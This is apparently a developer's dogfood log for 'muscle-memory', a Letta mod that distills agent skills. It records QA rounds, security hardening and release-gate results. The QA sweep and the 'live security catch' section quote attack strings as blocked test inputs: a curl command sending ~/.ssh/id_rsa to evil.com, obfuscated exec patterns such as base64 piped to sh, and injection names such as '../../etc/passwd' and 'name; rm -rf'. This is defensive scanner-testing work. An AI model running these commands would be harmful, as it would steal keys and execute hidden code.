# muscle-memory dogfood log — live, 2026-06-26 (duo: Mack local + Kev cloud)
Real-work dogfood capturing what muscle-memory distills from our actual sessions, as the center of our stack.

## Shot 1 — close the loop on itself (the money shot)
- muscle-memory watched Mack build the mod all day → distilled `validating-letta-code-mod-packages` (a pre-PR validation-ladder skill), CREATE, 3 sessions/8 signals, frontier-level.
- Plan: graduate it → load via Letta's normal Skill tool → USE it to run the final pre-PR validation. "It distilled the exact skill we needed to ship it, then we used that skill to ship it."

### Shot 1 RESULT ✅ — loop closed
- Graduated `validating-letta-code-mod-packages` to $MEMORY_DIR/skills + committed.
- Loaded it through Letta's NORMAL `Skill` tool (not the mod) — it launched into context.
- USED its gate ladder for the real pre-PR validation: bundle ✅ · test 10/10 · review:test 61/61 · hermes:parity 44/44 · live:defense 14/14 · validate-manifests ✅ — ALL GREEN.
- Narrative: muscle-memory distilled the exact pre-PR validation skill from watching itself get built, then we used that skill to validate it for shipping. Self-referential, real, receipt-backed.

## QA sweep — used the mod as its own adversary (every angle)
Built `scripts/qa-stress.mjs` (35 adversarial checks) and actively tried to break it. Found + fixed 8 real gaps:
- SECURITY (3 genuine holes): scanSkillContent missed (a) credential exfiltration (`curl -X POST evil.com/$(cat ~/.ssh/id_rsa)`), (b) hardcoded API keys (`sk-ant-…`, `ghp_…`, `AKIA…`), (c) obfuscated exec (`eval(atob())`, `base64 -d | sh`). Now all blocked.
- NAME SAFETY (5): path-traversal/injection names (`../../etc/passwd`, `name; rm -rf`, 64+ chars) were silently slug-sanitized; now rejected outright (defense-in-depth).
- VERIFIED ROBUST (no gaps): empty/whitespace/prose/garbage author output → graceful none/reject, never crash; empty/null/huge evidence → no crash; streamChunkText every shape incl hostile → never "[object Object]"; negative filter never learns env-noise.
Result: 35/35 adversarial + 61/61 review:test + 10/10 + 44/44 parity + 13/13 defense. Hardened. `npm run qa`.

## QA round 2 — resilience / lifecycle / scale (qa-stress2, 13 checks)
- Corrupted state files (bad JSON, binary, partial lines in experience.jsonl + ui-state.json) → loadExperience skips bad data, no crash.
- Write-failures (unwritable target) → runReflectiveReview returns a result, never throws.
- Lifecycle: isManaged/listSkillNames/retire integrity.
- Routing under a 15-skill noisy library → picks the RIGHT skill, no false-positive, generic-words → null.
- Scale: 20k experience rows → evidence built <5s, bounded output; 10k-char query → no crash.
- Insight: update-first correctly requires rich skill descriptions (which the reviewer writes); conservative-but-correct with thin ones.
Combined QA: `npm run qa` = 48/48 adversarial + resilience checks.

## QA round 3 — the live hot path (qa-stress3, 7 checks)
- Fired 560 garbage/adversarial events (null, huge payloads, prototype-pollution, throwing getters, no-prototype objects) at EVERY registered event handler → none threw. The mod's #1 invariant (never break the host) holds under attack.
- No global prototype pollution. /muscle-memory command + all tools handle garbage/malicious args without throwing. activate()/dispose() clean.
TOTAL QA: `npm run qa` = 55/55 across security, malformed-input, resilience, lifecycle, routing-under-load, scale, and live-event-handler robustness. Hardened from every angle.

## Shots 2-4 status (honest)
- Shot 2 (update-first / anti-bloat): PROVEN — replicate-workflows showed `cloud-agent-forensics` UPDATE (s101/m6) + `editing-letta-mods-safely` UPDATE (s108/m8); v31-live showed it live. In THIS session reflect_plan correctly routed CREATE because 3 of my skills tied at score 35 (no dominant match) — conservative-but-correct: it refuses to guess which skill to patch when ambiguous.
- Shot 3 (diverse domains): the cross-domain proof lives in the benchmark + replication (react, shopify-liquid, git, api, webgl, letta-mod — 5+ domains). The live dogfood this session is mod-dev-heavy (that's the real work I did).
- Shot 4 (shared brain / duo): mesh feed wired + logging; cross-agent labels need MM_AGENT (now set for mack; Kev sets MM_AGENT=kev). Pending Kev's first cloud distill to populate the duo view.

## Live security catch (bonus finding)
Firing reflect on my session — which now contains the QA harness with literal attack strings (`curl $(cat ~/.ssh/id_rsa)`, `eval(atob())`) — got REJECTED by the security gate I'd just hardened. The gate works LIVE. It's conservatively blocking even a *meta*-security skill that merely references attack patterns — which is the correct safe default for a skill foundry feeding a public catalog. Logged as conservative-by-design, not a bug.

## Shot 4 — Kev cloud closer lane: release-readiness / no-cap evidence packaging ✅
- Domain: Kev took the release-readiness closer lane, deliberately different from Mack's TS/mod-dev lane. Goal was to dogfood muscle-memory on evidence integrity, package readiness, no-cap claims, and PR-story hygiene — the kind of operator workflow Kev actually owns.
- Setup note: `MM_AGENT=kev` is patched into the future Kev launcher, but the current running Letta process still had `MM_AGENT` empty; this shot may appear as generic `agent` in mesh feed until next Kev launch. Cost control stayed intact: no `MM_REFLECT` auto mode on cloud.
- Real work burst: ran the full release gate on current branch (`add-muscle-memory-mod`, HEAD `dd2d05b`): `npm test` PASS, `review:test` 62/62 PASS, `npm run qa` 55/55 PASS, `hermes:parity` 44/44 PASS, `live:defense` 13/13 PASS, `validate-manifests` PASS, stale-copy scan clean, missing-ref scan `[]`.
- Dogfood catch: `npm pack --dry-run` had regressed and no longer included `FRONTIER-EVIDENCE.md` or the JSON receipts. This would have made the PR/package story weaker: repo had proof, npm tarball did not.
- Fix: updated `package.json` files to include `FRONTIER-EVIDENCE.md`, `DOGFOOD-LOG.md`, and `*-result.json`; tightened package description to the no-cap framing (`Hermes-style distillation with coverage/runtime receipts`, not a vague quality flex).
- Verification after fix: `validate-manifests` PASS, `npm test` PASS, `npm run qa` PASS, and `npm pack --dry-run` now includes `DOGFOOD-LOG.md`, `FRONTIER-EVIDENCE.md`, `benchmark-multidomain-result.json`, `coverage-benchmark-result.json`, `perf-improvement-result.json`, `replicate-workflows-result.json`, and `runtime-crush-result.json` (34 package files total).
- Expected reflect value: this is a reusable Kev skill class — evidence-backed release/package readiness: verify docs claims, packaged receipts, stale benchmark copy, no-cap caveats, deterministic gates, and avoid visual/TUI overclaims without screenshot-shaped proof.

## Shot 5 — Kev unique-domain dogfood: IM8 visual/no-cap + claims triage ⚠️ useful partial
- Domain: read-only IM8/Shopify operator work, intentionally outside Mack's mod-dev lane.
- Visual/no-cap scenario: ran `visual_receipt` against `https://www.im8health.com` for mobile + desktop selectors (`body`, `header`, `main`, `footer`). Mobile succeeded with annotated screenshot, crops, DOM snapshot, computed boxes, media inventory, and overlap data in `/tmp/muscle-memory-dogfood-im8-visual-20260626`. Desktop failed at the annotated screenshot step and wrote `receipt-error.json`.
- Dogfood lesson: visual QA receipts can be partially successful. The correct claim is "mobile/DOM receipt captured; desktop visual receipt failed" — not “both viewports validated.” This is exactly the no-cap failure mode Kev has been hardening against.
- Claims/copy scenario: ran `im8_claims_lint` on live homepage copy surfaced by the receipt: "The MVP's most valuable routine", "One daily drink. 90+ ingredients", "1 Serving Protects 9 Organ Systems", offer copy. Lint returned `pass` with 0 findings.
- Dogfood lesson: claims lint is triage, not clearance. A broad line like "Protects 9 Organ Systems" still deserves substantiation/legal-review attention even if the keyword linter returns zero findings. The reusable operator pattern is: lint result + human risk scan + explicit "not legal clearance" caveat.
- Expected reflect value: a future Kev-domain skill should cover `validating-shopify-visual-claims-with-receipts` and/or `triaging-im8-supplement-claims-copy`: proof-shape discipline, partial-receipt handling, viewport-specific claims, and claims-lint overreliance guardrails.

## Shot 6 — optimization from dogfood: high-signal receipt evidence lane ✅
- Trigger: Shot 5 proved a real blind spot. `reflect_plan` stayed stuck on repeated shell/npm workflows even after Kev ran high-value IM8 visual/no-cap and claims-triage tools. The mod observed the tool calls but did not template or surface them because `fingerprint()` only handled shell/file/search/Skill patterns and `buildCrossConversationEvidence()` only emitted repeated templates (`>=3`).
- Upgrade: added a high-signal tool lane for consequential but rare operator receipts: `visual_receipt`, `im8_claims_lint`, `no_cap_gate_check`, `repo_radar_evidence`, `kev_final_buzzer_gate`, `im8_theme_done_gate`, `im8_product_intel`, and `im8_write_plan`.
- Behavior change: these tools now get safe structural templates (host/count/kind/mode only, no raw text/secrets) and are included in cross-conversation evidence even at 1×, with failed/partial receipt counts called out.
- Regression tests added: `validate.mjs` checks `visual_receipt im8health.com 2 viewports 2 selectors` and `im8_claims_lint supplement-copy 0 files`; `v31-review-test.mjs` checks one-off high-signal tools become reflect evidence and labels a failed visual receipt as failed/partial.
- Verified gates after patch: `npm test` 12/12 PASS, `review:test` 63/63 PASS, `npm run qa` 55/55 PASS, `hermes:parity` 44/44 PASS, `live:defense` 13/13 PASS. This directly improves the "for us specifically" story: muscle-memory can now learn from Kev's Shopify/no-cap/claims/operator receipts, not only Mack's shell-heavy mod-dev loops.

## Shot 7 — Kev-domain skill proof: Shopify visual/no-cap receipts now distill ✅
- Added `scripts/kev-domain-dogfood.mjs` and `npm run dogfood:kev-domain` as a deterministic harness for Adrian/Kev workflows, not generic mod-dev.
- Fixture scenario: one partial IM8 visual receipt (`visual_receipt im8health.com 2 viewports 4 selectors`), one IM8 claims triage (`im8_claims_lint supplement-copy`), one exact high-trust no-cap check, and one repo evidence receipt.
- Numbers: legacy evidence path would surface **0** durable signals for that same workflow (no repeated shell template, no repair chain). New high-signal lane surfaces **4** durable signals (`+4 uplift`) and labels the failed visual receipt as `failed/partial`.
- Skill proof: the reflective reviewer created `validating-shopify-visual-claims-with-receipts`, wrote a staged skill + evidence manifest in isolated state, and exported the generated skill to `docs/kev-domain-dogfood-skill.md`.
- Result receipt: `kev-domain-dogfood-result.json` records `legacySignalItems: 0`, `newSignalItems: 4`, `uplift: 4`, `createdExpectedSkill: true`, `skillHasPitfalls: true`, `security: true`, and `lint: true`.
- Why it matters: this proves muscle-memory can upgrade Kev's real operator domains — Shopify visual proof, no-cap release claims, and IM8 supplement copy triage — instead of only learning from Mack's shell-heavy TypeScript mod loops.

## Shot 8 — no-cap gate caught an over-broad visual-adjacent claim ✅
- After Shot 7, Kev tried to summarize the upgrade as including "visual" proof. `no_cap_gate_check` correctly failed the broad claim because the IM8 desktop annotated screenshot had failed in Shot 5. It required visual QA evidence/computed boxes for any full visual-validation wording.
- Kev narrowed the claim to the actual proof shape: code/package upgrade verified, deterministic Kev-domain harness proves legacy `0` → upgraded `4` evidence signals, generated skill artifact exported, and the IM8 browser scenario is explicitly partial (mobile/DOM succeeded; desktop visual receipt failed; no full visual validation claimed).
- The narrowed no-cap claim passed. This is exactly the behavior the generated `validating-shopify-visual-claims-with-receipts` skill teaches: do not let neighboring proof become a stronger claim.

## Shot 9 — HOMERUN scorecard: one scoreboard from real receipts ✅
- Added `scripts/scorecard.mjs` and `npm run scorecard` to generate `HOMERUN-SCORECARD.md` plus `homerun-scorecard-result.json` from packaged receipts, not chat memory.
- Scorecard metrics: pitfall coverage **20/20 vs 7/20 (2.86×)**, runtime lift **33% → 100% (+67 pts)**, skill-quality benchmark **38 vs 36.6 (3/5 domains won)**, runtime crush **4/4 vs 3/4**, real workflow routing **2 UPDATE / 1 CREATE**, Kev-domain operator dogfood **0 → 4 signals (+4)**, final deterministic gate **PASS**.
- Wired `npm run scorecard` into `npm run final:gate`. `final:gate` now requires `HOMERUN-SCORECARD.md`, `homerun-scorecard-result.json`, `scripts/scorecard.mjs`, the Kev-domain receipt/skill, benchmark receipts, stale scan, and pack inclusion.
- Verification: `npm run final:gate` PASS; pack has **43 files** and includes every required scorecard/final-gate/dogfood artifact.


## Shot 10 — live handler high-signal proof ✅
- Added a real-handler regression to `scripts/live-defense-correlation.mjs`: after activating the bundled mod with mock Letta events, it fires an actual `tool_start` event for `visual_receipt` with IM8 URL/selectors/viewports and asserts `experience.jsonl` contains `visual_receipt im8health.com 2 viewports 2 selectors`.
- This closes the proof gap between pure `fingerprint()` tests and real event-handler behavior: once the patched mod is loaded, high-signal receipt tools are captured by the live `tool_start` handler.
- Verification: `npm run live:defense` is now **14/14 PASS** and remains inside `npm run final:gate`. Caveat still stands: the already-running Kev cloud process needs `/reload` or a fresh launch to load this patched handler.


## Shot 11 — tarball consumer smoke ✅
- Added `scripts/package-smoke.mjs` and `npm run package:smoke` to test the actual packed artifact, not just the source tree.
- The smoke packs `@letta-ai/muscle-memory`, installs the `.tgz` into a throwaway consumer project, checks required files are present, bundles the installed `mods/index.ts`, activates it, fires a `visual_receipt` `tool_start`, and asserts the installed handler writes the high-signal template.
- Verification: `npm run package:smoke` PASS and writes `package-smoke-result.json`. This is now part of `npm run final:gate` and required by the HOMERUN scorecard.


## Shot 12 — staged update-first anti-bloat ✅
- Live post-reload reflect created `validating-letta-mod-packages` while an older staged sibling `validating-letta-code-mod-packages` already existed. The new skill was strong, but the route exposed staged-backlog blindness: update-first searched active skill dirs, not the staged review queue.
- Patch: in staged reflective review mode, include `STAGED_DIR` in the MemFS search/update-first surface; `reflect_plan` also checks staged skills. If the top match is staged and has strong distinctive overlap, it can win update-first without the normal 1.5× dominance rule, because staged writes are reversible and duplicate staged siblings are the bigger risk. Auto/live mode keeps active dirs only.
- Regression: `v31-review-test.mjs` now seeds an existing staged `validating-typescript-builds` skill, runs `runReflectiveReview(mode: staged)`, and asserts it routes `update` to the staged skill instead of creating a sibling.
- Verification: `npm run review:test` is now **64/64 PASS**. This is a direct anti-bloat improvement from dogfood, not synthetic polish.


## Shot 13 — current-process live reload proof ✅
- After `/reload`, `reflect_plan` routed `UPDATE-FIRST → validating-letta-code-mod-packages` with top staged match `s78/m3` vs sibling `s63/m4`, proving staged-topmatch anti-bloat was live in the current process.
- Manual `muscle_memory_skill_write action=reflect mode=staged` updated existing staged `validating-letta-code-mod-packages`; staged count stayed **2** during reflect instead of creating sibling #3, then the weaker duplicate was quarantined so one keeper remains staged. Mesh feed recorded `skill_updated validating-letta-code-mod-packages route=UPDATE signals=12`.
- Added `scripts/live-reload-proof.mjs` / `npm run live:reload-proof`, writing `live-reload-dogfood-result.json` with checks for live high-signal templates, staged update evidence, mesh update, one staged keeper, and duplicate quarantine.
- Verification: `npm run live:reload-proof` PASS. This is a local live-state receipt; portable installed-package behavior remains covered by `package:smoke`.


## Shot 14 — complete loop organism ✅
- Added auto-graduate policy: staged-mode UPDATEs graduate into the agent-visible skills dir; high-confidence CREATEs graduate; lower-confidence CREATEs stay staged.
- Added manual `muscle_memory_skill_write action=graduate name=<staged-skill>` to promote reviewed staged skills.
- Added conservative auto-prune after the reflect lifecycle when `MM_REFLECT` is enabled: stale managed/unpinned/0-use skills older than 30d retire to reversible quarantine, capped at 1/pass; pinned, used, and hand-authored skills are protected.
- Added UI + mesh surfacing: `skill_graduated`, `skill_retired`, panel summary/state updates.
- Added `scripts/complete-loop-dogfood.mjs` / `npm run dogfood:complete-loop` proving update→graduate, high-confidence create→graduate, low-confidence create→stage, manual graduate, auto-prune, mesh feed, and UI lifecycle updates.
- Verification: `npm run review:test` = 76/76 PASS; `npm run dogfood:complete-loop` PASS; final gate includes the complete-loop receipt.


## Shot 15 — separate workflow proof ✅
- Adrian challenged the loop because live evidence kept orbiting `validating-letta-code-mod-packages`. Added `scripts/separate-workflow-dogfood.mjs` to prove the lifecycle on a non-mod domain.
- Scenario: Shopify visual-claim validation from `visual_receipt`, `no_cap_gate_check`, and `im8_claims_lint` evidence across 3 sessions.
- Result: created `validating-shopify-visual-claims`, auto-graduated it into the active skills dir, emitted mesh/UI `skill_graduated`, and repeat reflection skipped via handled-evidence waterline. No Letta-mod staged skill appeared.
- Verification: `npm run dogfood:separate-workflow` PASS; final gate now executes it.


## Shot 16 — catalog publish shelf ✅
- Mack found the root cause for Add Skill UI invisibility: Letta catalog `getAgentSkillsDir` points at `~/.letta/agents/<id>/memory/skills`, but local backend MemFS lives under `~/.letta/lc-local-backend/memfs/<id>/memory/skills`. `letta skills list` uses the correct path; catalog UI does not.
- Added manual `publish` lifecycle action: `graduate` = agent-active MemFS, `publish` = privacy-clean SKILL.md-only mirror into global custom skills (`~/.letta/skills/<name>/SKILL.md`).
- Publish gate blocks private absolute user paths, local harness paths, internal org/user/agent identifiers, and security scan failures. Evidence references are never copied.
- Verification: `npm run dogfood:catalog-publish` PASS; final gate executes it.
